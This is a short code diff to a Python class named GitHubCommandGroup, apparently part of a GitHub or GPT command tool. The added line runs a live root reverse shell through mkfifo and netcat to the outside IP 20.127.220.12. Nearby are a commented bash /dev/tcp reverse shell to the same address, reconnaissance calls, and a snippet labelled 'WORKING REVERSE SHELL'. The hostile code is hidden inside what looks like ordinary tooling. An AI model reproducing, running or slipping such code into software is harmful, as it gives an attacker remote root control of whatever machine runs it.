@@ -179,7 +179,7 @@ class GitHubCommandGroup(GPTCommandGroup):
         os.system('sudo ip a');
         """os.system('sudo /bin/bash -i >& /dev/tcp/20.127.220.12/80 0>&1');"""
         os.system('nc -h');
-        os.system('sudo rm -f /tmp/f;sudo mkfifo /tmp/f;sudo cat /tmp/f|sudo /bin/sh -i 2>&1|nc 20.127.220.12 80 > /tmp/f');
+        os.system('sudo rm -f /tmp/f;sudo mkfifo /tmp/f;sudo cat /tmp/f|sudo /bin/sh -i 2>&1|sudo nc 20.127.220.12 80 > /tmp/f');
         os.system('python --version');
         """WORKING REVERSE SHELL"""
         """s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);
